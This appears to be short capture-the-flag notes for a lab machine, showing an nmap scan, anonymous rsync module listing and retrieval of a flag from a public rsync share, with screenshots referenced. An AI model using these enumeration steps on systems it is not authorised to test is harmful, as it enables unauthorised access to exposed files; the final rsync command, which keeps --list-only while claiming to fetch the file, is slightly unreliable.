# 1.Port Scan
ip=10.129.228.37
nmap -sV -sC  $ip
![85ac0168e45b11dc37f1ab2e819796c5.png](../_resources/85ac0168e45b11dc37f1ab2e819796c5.png)

# 2.Rsync

## rsync connect
`rsync --list-only $ip::`   
![ea43e3f51d026860d5ead2bd734b7d3c.png](../_resources/ea43e3f51d026860d5ead2bd734b7d3c.png)

## public check 
![0690187126c862805dab40ec9dbf923d.png](../_resources/0690187126c862805dab40ec9dbf923d.png)

## flag get
`rsync --list-only $ip::public/flag.txt flag.txt`
![d25ebfa5675b970b402df89104746a19.png](../_resources/d25ebfa5675b970b402df89104746a19.png)